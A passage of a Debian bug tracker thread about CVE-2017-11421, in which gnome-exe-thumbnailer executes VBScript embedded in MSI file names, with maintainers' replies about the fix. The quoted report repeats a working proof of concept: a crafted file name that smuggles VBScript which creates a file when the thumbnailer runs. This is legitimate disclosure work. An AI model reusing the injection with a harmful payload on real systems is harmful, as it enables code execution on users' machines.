ncept%20does%20not%20work%2C%20install%20winetricks%20and%20run%20winetricks%20wsh56%20to%20upgrade%20the%20Windows%20Script%20Host.%0A%3E%20%3E%3E%20%0A%3E%20%3E%3E%20Create%20MSI%20Files%0A%3E%20%3E%3E%20%0A%3E%20%3E%3E%20Create%20a%20file%20named%20poc.xml%20with%20the%20following%20content%3A%0A%3E%20%3E%3E%20%0A%3E%20%3E%3E%20%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22utf-8%22%3F%3E%0A%3E%20%3E%3E%20%3CWix%20xmlns%3D%22http%3A%2F%2Fschemas.microsoft.com%2Fwix%2F2006%2Fwi%22%3E%0A%3E%20%3E%3E%20%3CProduct%20Version%3D%221.0%22%2F%3E%0A%3E%20%3E%3E%20%3C%2FWix%3E%0A%3E%20%3E%3E%20%0A%3E%20%3E%3E%20Execute%20the%20following%20Bourne%20Shell%20code%3A%0A%3E%20%3E%3E%20%0A%3E%20%3E%3E%20wixl%20-o%20poc.msi%20poc.xml%0A&amp;subject=Re%3A%20%5Bpkg-wine-party%5D%20Bug%23868705%3A%20gnome-exe-thumbnailer%3A%20Thumbnail%20generation%20for%20MSI%20files%20executes%20arbitrary%20VBScript&amp;References=%3C150032530207.9507.14135120544829383621.reportbug%40lustschutzbunker.localdomain%3E%20%3C8b0c01b0-607e-559d-f261-fd29ad271eed%40gmail.com%3E%0A%20%3C87vamqv9pv.fsf%40lustschutzbunker.localdomain%3E&amp;In-Reply-To=%3C87vamqv9pv.fsf%40lustschutzbunker.localdomain%3E">reply</a>):</p>
<div class="headers">
<img src="/cgi-bin/libravatar.cgi?email=nils%40dieweltistgarnichtso.net" alt="">
<div class="header"><span class="headerfield">From:</span> Nils Dagsson Moskopp &lt;nils@dieweltistgarnichtso.net&gt;</div>
<div class="header"><span class="headerfield">To:</span> James Lu &lt;bitflip3@gmail.com&gt;, Nils Dagsson Moskopp &lt;nils+debian-reportbug@dieweltistgarnichtso.net&gt;, 868705@bugs.debian.org</div>
<div class="header"><span class="headerfield">Cc:</span> Scott Ritchie &lt;scottritchie@ubuntu.com&gt;, Jan Nekvasil &lt;jan@nekvasil.cz&gt;</div>
<div class="header"><span class="headerfield">Subject:</span> Re: [pkg-wine-party] Bug#868705: gnome-exe-thumbnailer: Thumbnail generation for MSI files executes arbitrary VBScript</div>
<div class="header"><span class="headerfield">Date:</span> Tue, 18 Jul 2017 03:02:04 +0200</div>
</div>
<pre class="mime">[<a href="bugreport.cgi?att=0;bug=868705;msg=15">Message part 1</a> (text/plain, inline)]</pre>
<pre class="message">I like that the patch is less code. Deleted code is debugged code!
Btw, are you sure that using mssiinfo does not introduce new bugs?

Cheers,
Nils

James Lu &lt;bitflip3@gmail.com&gt; writes:

&gt; [ Unknown signature status ]
&gt; Hi Nils,
&gt;
&gt; I wasn&#39;t able to reproduce the exploit on my (64-bit) system with either
&gt; Caja and Nautilus (it also required setting up a new wineprefix in
&gt; ~/.wine). The msi thumbnail ended up generating without any version
&gt; information tag at all.
&gt;
&gt; Regardless, I&#39;ve gone and replaced the VBScript-based parsing entirely
&gt; with msitools&#39; msiinfo in
&gt; <a href="https://github.com/gnome-exe-thumbnailer/gnome-exe-thumbnailer/commit/1d8e3102dd8fd23431ae6127d14a236da6b4a4a5;">https://github.com/gnome-exe-thumbnailer/gnome-exe-thumbnailer/commit/1d8e3102dd8fd23431ae6127d14a236da6b4a4a5;</a>
&gt; hopefully this should fix the issue. I&#39;ll tag a new release soon and
&gt; look at pushing the fix to Debian.
&gt;
&gt; (Also CC&#39;ing the other maintainers, who I don&#39;t think are on the Debian
&gt; Wine list)
&gt;
&gt; Best,
&gt; James
&gt;
&gt; On 18/07/17 05:01 AM, Nils Dagsson Moskopp wrote:
&gt;&gt; Package: gnome-exe-thumbnailer
&gt;&gt; Version: 0.9.4-2
&gt;&gt; Severity: grave
&gt;&gt; Tags: security
&gt;&gt; Justification: user security hole
&gt;&gt; 
&gt;&gt; Dear Maintainer,
&gt;&gt; 
&gt;&gt; the following PoC is copied verbatim from my post about the parsing issue:
&gt;&gt; <a href="http://news.dieweltistgarnichtso.net/posts/gnome-thumbnailer-msi-fail.html">http://news.dieweltistgarnichtso.net/posts/gnome-thumbnailer-msi-fail.html</a>
&gt;&gt; 
&gt;&gt; Proof of Concept
&gt;&gt; 
&gt;&gt; Install Dependencies
&gt;&gt; 
&gt;&gt; On Debian GNU/Linux, install the packages gnome-exe-thumbnailer, nautilus and wixl. The wixl package is only needed to create MSI files that trigger the thumbnailer.
&gt;&gt; 
&gt;&gt; If the proof of concept does not work, install winetricks and run winetricks wsh56 to upgrade the Windows Script Host.
&gt;&gt; 
&gt;&gt; Create MSI Files
&gt;&gt; 
&gt;&gt; Create a file named poc.xml with the following content:
&gt;&gt; 
&gt;&gt; &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&gt;&gt; &lt;Wix xmlns=&quot;<a href="http://schemas.microsoft.com/wix/2006/wi&quot;">http://schemas.microsoft.com/wix/2006/wi&quot;</a>&gt;
&gt;&gt; &lt;Product Version=&quot;1.0&quot;/&gt;
&gt;&gt; &lt;/Wix&gt;
&gt;&gt; 
&gt;&gt; Execute the following Bourne Shell code:
&gt;&gt; 
&gt;&gt; wixl -o poc.msi poc.xml
&gt;&gt; cp poc.msi &quot;poc.msi\&quot;,0):Set fso=CreateObject(\&quot;Scripting.FileSystemObject\&quot;):Set poc=fso.CreateTextFile(\&quot;badtaste.txt\&quot;)&#39;.msi&quot;
&gt;&gt; 
&gt;&gt; Trigger Execution
&gt;&gt; 
&gt;&gt; Start GNOME Files and navigate to the folder with the MSI files. An empty file with the name badtaste.txt should appear.
&gt;&gt; 
&gt;&gt; *** End of the template - remove these template lines ***
&gt;&gt; 
&gt;&gt; 
&gt;&gt; -- System Information:
&gt;&gt; Debian Release: 9.0
&gt;&gt;   APT prefers stable
&gt;&gt;   APT policy: (500, &#39;stable&#39;)
&gt;&gt; Architecture: i386 (i686)
&gt;&gt; 
&gt;&gt; Kernel: Linux 3.16.0-4-686-pae (SMP w/1 CPU core)
&gt;&gt; Locale: LANG=de_DE.UTF-8, LC_CTYPE=de_DE.UTF-8 (charmap=UTF-8)
&gt;&gt; Shell: /bin/sh linked to /bin/dash
&gt;&gt; Init: sysvinit (via /sbin/init)
&gt;&gt; 
&gt;&gt; Versions of packages gnome-exe-thumbnailer depends on:
&gt;&gt; ii  icoutils                         0.31.2-1.1
&gt;&gt; ii  imagemagick                      8:6.9.7.4+dfsg-11
&gt;&gt; ii  imagemagick-6.q16 [imagemagick]  8:6.9.7.4+dfsg-11
&gt;&gt; ii  libglib2.0-bin                   2.50.3-2
&gt;&gt; 
&gt;&gt; Versions of packages gnome-exe-thumbnailer recommends:
&gt;&gt; pn  wine                                                                 &lt;none&gt;
&gt;&gt; pn  wine64-tools | wine32-tools | wine64-development-tools | wine32-dev  &lt;none&gt;
&gt;&gt; 
&gt;&gt; gnome-exe-thumbnailer suggests no packages.
&gt;&gt; 
&gt;&gt; -- no debconf information
&gt;&gt; 
&gt;&gt; _______________________________________________
&gt;&gt; pkg-wine-party mailing list
&gt;&gt; pkg-wine-party@lists.alioth.debian.org
&gt;&gt; <a href="http://lists.alioth.debian.org/cgi-bin/mailman/listinfo/pkg-wine-party">http://lists.alioth.debian.org/cgi-bin/mailman/listinfo/pkg-wine-party</a>
&gt;&gt; 
&gt;

-- 
Nils Dagsson Moskopp // erlehmann
&lt;<a href="http://dieweltistgarnichtso.net">http://dieweltistgarnichtso.net</a>&gt;
</pre>
<pre class="mime">[<a href="bugreport.cgi?att=1;bug=868705;filename=signature.asc;msg=15">signature.asc</a> (application/pgp-signature, inline)]</pre>

<div class="infmessage"><hr><p>
<a name="16"></a>
<!-- request_addr: debian-bugs-dist@lists.debian.org, Debian Wine Party &lt;pkg-wine-party@lists.alioth.debian.org&gt; -->
<!-- time:1500340505 -->
<strong>Information forwarded</strong>
to <code>debian-bugs-dist@lists.debian.org, Debian Wine Party &lt;pkg-wine-party@lists.alioth.debian.org&gt;</code>:<br>
<code>Bug#868705</code>; Package <code>gnome-exe-thumbnailer</code>.
 (Tue, 18 Jul 2017 01:15:05 GMT) (<a href="bugreport.cgi?bug=868705;msg=17">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=17">mbox</a>, <a href="#16">link</a>).</p></p></div>

<div class="infmessage"><hr><p>
<a name="18"></a>
<!-- request_addr: James Lu &lt;bitflip3@gmail.com&gt; -->
<!-- time:1500340505 -->
<strong>Acknowledgement sent</strong>
to <code>James Lu &lt;bitflip3@gmail.com&gt;</code>:<br>
Extra info received and forwarded to list.  Copy sent to <code>Debian Wine Party &lt;pkg-wine-party@lists.alioth.debian.org&gt;</code>.
 (Tue, 18 Jul 2017 01:15:05 GMT) (<a href="bugreport.cgi?bug=868705;msg=19">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=19">mbox</a>, <a href="#18">link</a>).</p></p></div>

<hr><p class="msgreceived"><a name="20"></a><a name="msg20"></a><a href="#20">Message #20</a> received at 868705@bugs.debian.org (<a href="bugreport.cgi?bug=868705;msg=20">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=20">mbox</a>, <a href="mailto:868705@bugs.debian.org?In-Reply-To=%3Cf40d18d8-d58d-9590-64fc-89441f3775ee%40gmail.com%3E&amp;body=On%20Tue%2C%2018%20Jul%202017%2009%3A12%3A04%20%2B0800%20James%20Lu%20%3Cbitflip3%40gmail.com%3E%20wrote%3A%0A%3E%20Control%3A%20tag%20868705%20%2B%20pending%20fixed-upstream%0A%3E%20%0A%3E%20Hi%2C%0A%3E%20%0A%3E%20msiinfo%20is%20part%20of%20msitools%2C%20just%20like%20wixl%3A%0A%3E%20https%3A%2F%2Fgithub.com%2FGNOME%2Fmsitools.%20I%20haven%27t%20audited%20the%20code%2C%20but%20being%0A%3E%20under%20the%20GNOME%20umbrella%20and%20having%20a%20history%20of%205%20years%20probably%20means%0A%3E%20that%20it%27s%20reliable%20enough.%0A%3E%20%0A%3E%20%28I%27ve%20also%20heard%20reports%20so%20far%20that%20msiinfo%20is%20a%20lot%20%2Ffaster%2F%20than%0A%3E%20running%20code%20through%20Wine%27s%20cscript%2C%20which%20is%20not%20really%20much%20of%20a%0A%3E%20surprise.%29%0A%3E%20%0A%3E%20Best%2C%0A%3E%20James%0A%3E%20%0A%3E%20On%2018%2F07%2F17%2009%3A02%20AM%2C%20Nils%20Dagsson%20Moskopp%20wrote%3A%0A%3E%20%3E%20I%20like%20that%20the%20patch%20is%20less%20code.%20Deleted%20code%20is%20debugged%20code%21%0A%3E%20%3E%20Btw%2C%20are%20you%20sure%20that%20using%20mssiinfo%20does%20not%20introduce%20new%20bugs%3F%0A%3E%20%3E%20%0A%3E%20%3E%20Cheers%2C%0A%3E%20%3E%20Nils%0A%3E%20%3E%20%0A%3E%20%3E%20James%20Lu%20%3Cbitflip3%40gmail.com%3E%20writes%3A%0A%3E%20%3E%20%0A%3E%20%3E%3E%20%5B%20Unknown%20signature%20status%20%5D%0A%3E%20%3E%3E%20Hi%20Nils%2C%0A%3E%20%3E%3E%0A%3E%20%3E%3E%20I%20wasn%27t%20able%20to%20reproduce%20the%20exploit%20on%20my%20%2864-bit%29%20system%20with%20either%0A%3E%20%3E%3E%20Caja%20and%20Nautilus%20%28it%20also%20required%20setting%20up%20a%20new%20wineprefix%20in%0A%3E%20%3E%3E%20~%2F.wine%29.%20The%20msi%20thumbnail%20ended%20up%20generating%20without%20any%20version%0A%3E%20%3E%3E%20information%20tag%20at%20all.%0A%3E%20%3E%3E%0A%3E%20%3E%3E%20Regardless%2C%20I%27ve%20gone%20and%20replaced%20the%20VBScript-based%20parsing%20entirely%0A%3E%20%3E%3E%20with%20msitools%27%20msiinfo%20in%0A%3E%20%3E%3E%20https%3A%2F%2Fgithub.com%2Fgnome-exe-thumbnailer%2Fgnome-exe-thumbnailer%2Fcommit%2F1d8e3102dd8fd23431ae6127d14a236da6b4a4a5%3B%0A%3E%20%3E%3E%20hopefully%20this%20should%20fix%20the%20issue.%20I%27ll%20tag%20a%20new%20release%20soon%20and%0A%3E%20%3E%3E%20look%20at%20pushing%20the%20fix%20to%20Debian.%0A%3E%20%3E%3E%0A%3E%20%3E%3E%20%28Also%20CC%27ing%20the%20other%20maintainers%2C%20who%20I%20don%27t%20think%20are%20on%20the%20Debian%0A%3E%20%3E%3E%20Wine%20list%29%0A%3E%20%3E%3E%0A%3E%20%3E%3E%20Best%2C%0A%3E%20%3E%3E%20James%0A%3E%20%3E%3E%0A%3E%20%3E%3E%20On%2018%2F07%2F17%2005%3A01%20AM%2C%20Nils%20Dagsson%20Moskopp%20wrote%3A%0A%3E%20%3E%3E%3E%20Package%3A%20gnome-exe-thumbnailer%0A%3E%20%3E%3E%3E%20Version%3A%200.9.4-2%0A%3E%20%3E%3E%3E%20Severity%3A%20grave%0A%3E%20%3E%3E%3E%20Tags%3A%20security%0A%3E%20%3E%3E%3E%20Justification%3A%20user%20security%20hole%0A%3E%20%3E%3E%3E%0A%3E%20%3E%3E%3E%20Dear%20Maintainer%2C%0A%3E%20%3E%3E%3E%0A%3E%20%3E%3E%3E%20the%20following%20PoC%20is%20copied%20verbatim%20from%20my%20post%20about%20the%20parsing%20issue%3A%0A%3E%20%3E%3E%3E%20http%3A%2F%2Fnews.dieweltistgarnichtso.net%2Fposts%2Fgnome-thumbnailer-msi-fail.html%0A%3E%20%3E%3E%3E%0A%3E%20%3E%3E%3E%20Proof%20of%20Concept%0A%3E%20%3E%3E%3E%0A%3E%20%3E%3E%3E%20Install%20Dependencies%0A&amp;subject=Re%3A%20%5Bpkg-wine-party%5D%20Bug%23868705%3A%20gnome-exe-thumbnailer%3A%20Thumbnail%0A%20generation%20for%20MSI%20files%20executes%20arbitrary%20VBScript&amp;References=%3C150032530207.9507.14135120544829383621.reportbug%40lustschutzbunker.localdomain%3E%0A%20%3C8b0c01b0-607e-559d-f261-fd29ad271eed%40gmail.com%3E%0A%20%3C87vamqv9pv.fsf%40lustschutzbunker.localdomain%3E%0A%20%3Cf40d18d8-d58d-9590-64fc-89441f3775ee%40gmail.com%3E">reply</a>):</p>
<div class="headers">
<img src="/cgi-bin/libravatar.cgi?email=bitflip3%40gmail.com" alt="">
<div class="header"><span class="headerfield">From:</span> James Lu &lt;bitflip3@gmail.com&gt;</div>
<div class="header"><span class="headerfield">To:</span> Nils Dagsson Moskopp &lt;nils@dieweltistgarnichtso.net&gt;,
 868705@bugs.debian.org</div>
<div class="header"><span class="headerfield">Cc:</span> Scott Ritchie &lt;scottritchie@ubuntu.com&gt;, Jan Nekvasil &lt;jan@nekvasil.cz&gt;</div>
<div class="header"><span class="headerfield">Subject:</span> Re: [pkg-wine-party] Bug#868705: gnome-exe-thumbnailer: Thumbnail
 generation for MSI files executes arbitrary VBScript</div>
<div class="header"><span class="headerfield">Date:</span> Tue, 18 Jul 2017 09:12:04 +0800</div>
</div>
<pre class="mime">[<a href="bugreport.cgi?att=0;bug=868705;msg=20">Message part 1</a> (text/plain, inline)]</pre>
<pre class="message">Control: tag 868705 + pending fixed-upstream

Hi,

msiinfo is part of msitools, just like wixl:
<a href="https://github.com/GNOME/msitools">https://github.com/GNOME/msitools</a>. I haven&#39;t audited the code, but being
under the GNOME umbrella and having a history of 5 years probably means
that it&#39;s reliable enough.

(I&#39;ve also heard reports so far that msiinfo is a lot /faster/ than
running code through Wine&#39;s cscript, which is not really much of a
surprise.)

Best,
James

On 18/07/17 09:02 AM, Nils Dagsson Moskopp wrote:
&gt; I like that the patch is less code. Deleted code is debugged code!
&gt; Btw, are you sure that using mssiinfo does not introduce new bugs?
&gt; 
&gt; Cheers,
&gt; Nils
&gt; 
&gt; James Lu &lt;bitflip3@gmail.com&gt; writes:
&gt; 
&gt;&gt; [ Unknown signature status ]
&gt;&gt; Hi Nils,
&gt;&gt;
&gt;&gt; I wasn&#39;t able to reproduce the exploit on my (64-bit) system with either
&gt;&gt; Caja and Nautilus (it also required setting up a new wineprefix in
&gt;&gt; ~/.wine). The msi thumbnail ended up generating without any version
&gt;&gt; information tag at all.
&gt;&gt;
&gt;&gt; Regardless, I&#39;ve gone and replaced the VBScript-based parsing entirely
&gt;&gt; with msitools&#39; msiinfo in
&gt;&gt; <a href="https://github.com/gnome-exe-thumbnailer/gnome-exe-thumbnailer/commit/1d8e3102dd8fd23431ae6127d14a236da6b4a4a5;">https://github.com/gnome-exe-thumbnailer/gnome-exe-thumbnailer/commit/1d8e3102dd8fd23431ae6127d14a236da6b4a4a5;</a>
&gt;&gt; hopefully this should fix the issue. I&#39;ll tag a new release soon and
&gt;&gt; look at pushing the fix to Debian.
&gt;&gt;
&gt;&gt; (Also CC&#39;ing the other maintainers, who I don&#39;t think are on the Debian
&gt;&gt; Wine list)
&gt;&gt;
&gt;&gt; Best,
&gt;&gt; James
&gt;&gt;
&gt;&gt; On 18/07/17 05:01 AM, Nils Dagsson Moskopp wrote:
&gt;&gt;&gt; Package: gnome-exe-thumbnailer
&gt;&gt;&gt; Version: 0.9.4-2
&gt;&gt;&gt; Severity: grave
&gt;&gt;&gt; Tags: security
&gt;&gt;&gt; Justification: user security hole
&gt;&gt;&gt;
&gt;&gt;&gt; Dear Maintainer,
&gt;&gt;&gt;
&gt;&gt;&gt; the following PoC is copied verbatim from my post about the parsing issue:
&gt;&gt;&gt; <a href="http://news.dieweltistgarnichtso.net/posts/gnome-thumbnailer-msi-fail.html">http://news.dieweltistgarnichtso.net/posts/gnome-thumbnailer-msi-fail.html</a>
&gt;&gt;&gt;
&gt;&gt;&gt; Proof of Concept
&gt;&gt;&gt;
&gt;&gt;&gt; Install Dependencies
&gt;&gt;&gt;
&gt;&gt;&gt; On Debian GNU/Linux, install the packages gnome-exe-thumbnailer, nautilus and wixl. The wixl package is only needed to create MSI files that trigger the thumbnailer.
&gt;&gt;&gt;
&gt;&gt;&gt; If the proof of concept does not work, install winetricks and run winetricks wsh56 to upgrade the Windows Script Host.
&gt;&gt;&gt;
&gt;&gt;&gt; Create MSI Files
&gt;&gt;&gt;
&gt;&gt;&gt; Create a file named poc.xml with the following content:
&gt;&gt;&gt;
&gt;&gt;&gt; &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&gt;&gt;&gt; &lt;Wix xmlns=&quot;<a href="http://schemas.microsoft.com/wix/2006/wi&quot;">http://schemas.microsoft.com/wix/2006/wi&quot;</a>&gt;
&gt;&gt;&gt; &lt;Product Version=&quot;1.0&quot;/&gt;
&gt;&gt;&gt; &lt;/Wix&gt;
&gt;&gt;&gt;
&gt;&gt;&gt; Execute the following Bourne Shell code:
&gt;&gt;&gt;
&gt;&gt;&gt; wixl -o poc.msi poc.xml
&gt;&gt;&gt; cp poc.msi &quot;poc.msi\&quot;,0):Set fso=CreateObject(\&quot;Scripting.FileSystemObject\&quot;):Set poc=fso.CreateTextFile(\&quot;badtaste.txt\&quot;)&#39;.msi&quot;
&gt;&gt;&gt;
&gt;&gt;&gt; Trigger Execution
&gt;&gt;&gt;
&gt;&gt;&gt; Start GNOME Files and navigate to the folder with the MSI files. An empty file with the name badtaste.txt should appear.
&gt;&gt;&gt;
&gt;&gt;&gt; *** End of the template - remove these template lines ***
&gt;&gt;&gt;
&gt;&gt;&gt;
&gt;&gt;&gt; -- System Information:
&gt;&gt;&gt; Debian Release: 9.0
&gt;&gt;&gt;   APT prefers stable
&gt;&gt;&gt;   APT policy: (500, &#39;stable&#39;)
&gt;&gt;&gt; Architecture: i386 (i686)
&gt;&gt;&gt;
&gt;&gt;&gt; Kernel: Linux 3.16.0-4-686-pae (SMP w/1 CPU core)
&gt;&gt;&gt; Locale: LANG=de_DE.UTF-8, LC_CTYPE=de_DE.UTF-8 (charmap=UTF-8)
&gt;&gt;&gt; Shell: /bin/sh linked to /bin/dash
&gt;&gt;&gt; Init: sysvinit (via /sbin/init)
&gt;&gt;&gt;
&gt;&gt;&gt; Versions of packages gnome-exe-thumbnailer depends on:
&gt;&gt;&gt; ii  icoutils                         0.31.2-1.1
&gt;&gt;&gt; ii  imagemagick                      8:6.9.7.4+dfsg-11
&gt;&gt;&gt; ii  imagemagick-6.q16 [imagemagick]  8:6.9.7.4+dfsg-11
&gt;&gt;&gt; ii  libglib2.0-bin                   2.50.3-2
&gt;&gt;&gt;
&gt;&gt;&gt; Versions of packages gnome-exe-thumbnailer recommends:
&gt;&gt;&gt; pn  wine                                                                 &lt;none&gt;
&gt;&gt;&gt; pn  wine64-tools | wine32-tools | wine64-development-tools | wine32-dev  &lt;none&gt;
&gt;&gt;&gt;
&gt;&gt;&gt; gnome-exe-thumbnailer suggests no packages.
&gt;&gt;&gt;
&gt;&gt;&gt; -- no debconf information
&gt;&gt;&gt;
&gt;&gt;&gt; _______________________________________________
&gt;&gt;&gt; pkg-wine-party mailing list
&gt;&gt;&gt; pkg-wine-party@lists.alioth.debian.org
&gt;&gt;&gt; <a href="http://lists.alioth.debian.org/cgi-bin/mailman/listinfo/pkg-wine-party">http://lists.alioth.debian.org/cgi-bin/mailman/listinfo/pkg-wine-party</a>
&gt;&gt;&gt;
&gt;&gt;
&gt; 

</pre>
<pre class="mime">[<a href="bugreport.cgi?att=1;bug=868705;filename=signature.asc;msg=20">signature.asc</a> (application/pgp-signature, attachment)]</pre>

<div class="msgreceived"><hr><p>
<a name="21"></a>
<!-- command:tag -->
<!-- requester: James Lu &lt;bitflip3@gmail.com&gt; -->
<!-- request_addr: 868705-submit@bugs.debian.org -->
<!-- time:1500340505 -->
<!-- new_data:
$new_data = {
              &#39;keywords&#39; =&gt; &#39;fixed-upstream security pending&#39;
            };
-->
<!-- old_data:
$old_data = {
              &#39;keywords&#39; =&gt; &#39;security&#39;
            };
-->
<strong>Added tag(s) fixed-upstream and pending.</strong>
Request was from <code>James Lu &lt;bitflip3@gmail.com&gt;</code>
to <code>868705-submit@bugs.debian.org</code>.
 (Tue, 18 Jul 2017 01:15:05 GMT) (<a href="bugreport.cgi?bug=868705;msg=22">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=22">mbox</a>, <a href="#21">link</a>).</p></p></div>

<div class="msgreceived"><hr><p>
<a name="23"></a>
<!-- command:tag -->
<!-- requester: Laurent Bigonville &lt;bigon@debian.org&gt; -->
<!-- request_addr: control@bugs.debian.org -->
<!-- time:1500359945 -->
<!-- new_data:
$new_data = {
              &#39;keywords&#39; =&gt; &#39;sid security pending buster fixed-upstream stretch&#39;
            };
-->
<!-- old_data:
$old_data = {
              &#39;keywords&#39; =&gt; &#39;fixed-upstream security pending&#39;
            };
-->
<strong>Added tag(s) sid, stretch, and buster.</strong>
Request was from <code>Laurent Bigonville &lt;bigon@debian.org&gt;</code>
to <code>control@bugs.debian.org</code>.
 (Tue, 18 Jul 2017 06:39:05 GMT) (<a href="bugreport.cgi?bug=868705;msg=24">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=24">mbox</a>, <a href="#23">link</a>).</p></p></div>

<div class="infmessage"><hr><p>
<a name="25"></a>
<!-- request_addr: debian-bugs-dist@lists.debian.org, Debian Wine Party &lt;pkg-wine-party@lists.alioth.debian.org&gt; -->
<!-- time:1500404223 -->
<strong>Information forwarded</strong>
to <code>debian-bugs-dist@lists.debian.org, Debian Wine Party &lt;pkg-wine-party@lists.alioth.debian.org&gt;</code>:<br>
<code>Bug#868705</code>; Package <code>gnome-exe-thumbnailer</code>.
 (Tue, 18 Jul 2017 18:57:03 GMT) (<a href="bugreport.cgi?bug=868705;msg=26">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=26">mbox</a>, <a href="#25">link</a>).</p></p></div>

<div class="infmessage"><hr><p>
<a name="27"></a>
<!-- request_addr: Salvatore Bonaccorso &lt;carnil@debian.org&gt; -->
<!-- time:1500404223 -->
<strong>Acknowledgement sent</strong>
to <code>Salvatore Bonaccorso &lt;carnil@debian.org&gt;</code>:<br>
Extra info received and forwarded to list.  Copy sent to <code>Debian Wine Party &lt;pkg-wine-party@lists.alioth.debian.org&gt;</code>.
 (Tue, 18 Jul 2017 18:57:03 GMT) (<a href="bugreport.cgi?bug=868705;msg=28">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=28">mbox</a>, <a href="#27">link</a>).</p></p></div>

<hr><p class="msgreceived"><a name="29"></a><a name="msg29"></a><a href="#29">Message #29</a> received at 868705@bugs.debian.org (<a href="bugreport.cgi?bug=868705;msg=29">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=29">mbox</a>, <a href="mailto:868705@bugs.debian.org?In-Reply-To=%3C20170718185317.bzervuwoahorskfk%40eldamar.local%3E&amp;subject=Re%3A%20Bug%23868705%3A%20gnome-exe-thumbnailer%3A%20Thumbnail%20generation%20for%20MSI%0A%20files%20executes%20arbitrary%20VBScript&amp;References=%3C150032530207.9507.14135120544829383621.reportbug%40lustschutzbunker.localdomain%3E%0A%20%3C20170718185317.bzervuwoahorskfk%40eldamar.local%3E&amp;body=On%20Tue%2C%2018%20Jul%202017%2020%3A53%3A17%20%2B0200%20Salvatore%20Bonaccorso%20%3Ccarnil%40debian.org%3E%20wrote%3A%0A%3E%20Control%3A%20retitle%20-1%20gnome-exe-thumbnailer%3A%20CVE-2017-11421%3A%20Thumbnail%20generation%20for%20MSI%20files%20executes%20arbitrary%20VBScript%0A%3E%20%20%0A%3E%20Hi%0A%3E%20%0A%3E%20CVE-2017-11421%20has%20been%20assigned%20for%20this%20issue.%0A%3E%20%0A%3E%20Regards%2C%0A%3E%20Salvatore%0A%3E%20%0A%3E%20%0A">reply</a>):</p>
<div class="headers">
<img src="/cgi-bin/libravatar.cgi?email=carnil%40debian.org" alt="">
<div class="header"><span class="headerfield">From:</span> Salvatore Bonaccorso &lt;carnil@debian.org&gt;</div>
<div class="header"><span class="headerfield">To:</span> Nils Dagsson Moskopp &lt;nils+debian-reportbug@dieweltistgarnichtso.net&gt;,
	868705@bugs.debian.org</div>
<div class="header"><span class="headerfield">Subject:</span> Re: Bug#868705: gnome-exe-thumbnailer: Thumbnail generation for MSI
 files executes arbitrary VBScript</div>
<div class="header"><span class="headerfield">Date:</span> Tue, 18 Jul 2017 20:53:17 +0200</div>
</div>
<pre class="message">Control: retitle -1 gnome-exe-thumbnailer: <a href="https://security-tracker.debian.org/tracker/CVE-2017-11421">CVE-2017-11421</a>: Thumbnail generation for MSI files executes arbitrary VBScript
 
Hi

<a href="https://security-tracker.debian.org/tracker/CVE-2017-11421">CVE-2017-11421</a> has been assigned for this issue.

Regards,
Salvatore


</pre>

<div class="msgreceived"><hr><p>
<a name="30"></a>
<!-- command:title -->
<!-- requester: Salvatore Bonaccorso &lt;carnil@debian.org&gt; -->
<!-- request_addr: 868705-submit@bugs.debian.org -->
<!-- time:1500404223 -->
<!-- new_data:
$new_data = {
              &#39;subject&#39; =&gt; &#39;gnome-exe-thumbnailer: CVE-2017-11421: Thumbnail generation for MSI files executes arbitrary VBScript&#39;
            };
-->
<!-- old_data:
$old_data = {
              &#39;subject&#39; =&gt; &#39;gnome-exe-thumbnailer: Thumbnail generation for MSI files executes arbitrary VBScript&#39;
            };
-->
<strong>Changed Bug title to &#39;gnome-exe-thumbnailer: CVE-2017-11421: Thumbnail generation for MSI files executes arbitrary VBScript&#39; from &#39;gnome-exe-thumbnailer: Thumbnail generation for MSI files executes arbitrary VBScript&#39;.</strong>
Request was from <code>Salvatore Bonaccorso &lt;carnil@debian.org&gt;</code>
to <code>868705-submit@bugs.debian.org</code>.
 (Tue, 18 Jul 2017 18:57:03 GMT) (<a href="bugreport.cgi?bug=868705;msg=31">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=31">mbox</a>, <a href="#30">link</a>).</p></p></div>

<div class="infmessage"><hr><p>
<a name="32"></a>
<!-- request_addr: debian-bugs-dist@lists.debian.org, Debian Wine Party &lt;pkg-wine-party@lists.alioth.debian.org&gt; -->
<!-- time:1500406022 -->
<strong>Information forwarded</strong>
to <code>debian-bugs-dist@lists.debian.org, Debian Wine Party &lt;pkg-wine-party@lists.alioth.debian.org&gt;</code>:<br>
<code>Bug#868705</code>; Package <code>gnome-exe-thumbnailer</code>.
 (Tue, 18 Jul 2017 19:27:02 GMT) (<a href="bugreport.cgi?bug=868705;msg=33">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=33">mbox</a>, <a href="#32">link</a>).</p></p></div>

<div class="infmessage"><hr><p>
<a name="34"></a>
<!-- request_addr: Stephen Kitt &lt;skitt@debian.org&gt; -->
<!-- time:1500406022 -->
<strong>Acknowledgement sent</strong>
to <code>Stephen Kitt &lt;skitt@debian.org&gt;</code>:<br>
Extra info received and forwarded to list.  Copy sent to <code>Debian Wine Party &lt;pkg-wine-party@lists.alioth.debian.org&gt;</code>.
 (Tue, 18 Jul 2017 19:27:02 GMT) (<a href="bugreport.cgi?bug=868705;msg=35">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=35">mbox</a>, <a href="#34">link</a>).</p></p></div>

